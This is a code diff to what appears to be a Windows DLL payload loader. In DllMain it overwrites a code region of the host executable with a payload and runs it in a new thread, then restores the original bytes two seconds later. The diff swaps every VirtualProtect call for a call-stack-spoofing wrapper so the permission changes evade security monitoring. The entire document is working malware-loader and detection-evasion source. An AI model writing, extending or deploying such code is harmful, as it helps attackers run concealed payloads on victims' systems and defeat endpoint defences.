@@ -22,6 +22,7 @@
  */
 
 #include <windows.h>
+#include "spoof.h"
 
 typedef void  (WINAPI *pfnGetPayload)(void **, SIZE_T *);
 typedef void  (WINAPI *pfnSetThreadHandle)(HANDLE);
@@ -45,9 +46,9 @@ static DWORD WINAPI restore_slot(LPVOID p)
     restore_ctx_t *c = (restore_ctx_t *)p;
     Sleep(2000);
     DWORD old;
-    if (VirtualProtect(c->slot, c->len, PAGE_READWRITE, &old)) {
+    if (spoof_vp(c->slot, c->len, PAGE_READWRITE, &old)) {
         memcpy(c->slot, c->original, c->len);
-        VirtualProtect(c->slot, c->len, PAGE_EXECUTE_READ, &old);
+        spoof_vp(c->slot, c->len, PAGE_EXECUTE_READ, &old);
     }
     HeapFree(GetProcessHeap(), 0, c);
     return 0;
@@ -61,6 +62,10 @@ BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved)
         return TRUE;
 
     DisableThreadLibraryCalls(hinst);
+
+    /* Resolve gadget + signal frames for call-stack spoofing. Failure is
+     * non-fatal — spoof_vp falls back to plain VirtualProtect. */
+    spoof_init();
 
     HMODULE exe = GetModuleHandleW(NULL);
     if (!exe) return FALSE;
@@ -89,9 +94,9 @@ BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved)
     memcpy(ctx->original, slot, len);
 
     DWORD old;
-    if (!VirtualProtect(slot, len, PAGE_READWRITE, &old))    { HeapFree(heap, 0, ctx); return FALSE; }
+    if (!spoof_vp(slot, len, PAGE_READWRITE, &old))    { HeapFree(heap, 0, ctx); return FALSE; }
     memcpy(slot, pt, len);
-    if (!VirtualProtect(slot, len, PAGE_EXECUTE_READ, &old)) { HeapFree(heap, 0, ctx); return FALSE; }
+    if (!spoof_vp(slot, len, PAGE_EXECUTE_READ, &old)) { HeapFree(heap, 0, ctx); return FALSE; }
 
     HANDLE t = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)slot, NULL, 0, NULL);
     if (!t) { HeapFree(heap, 0, ctx); return FALSE; }
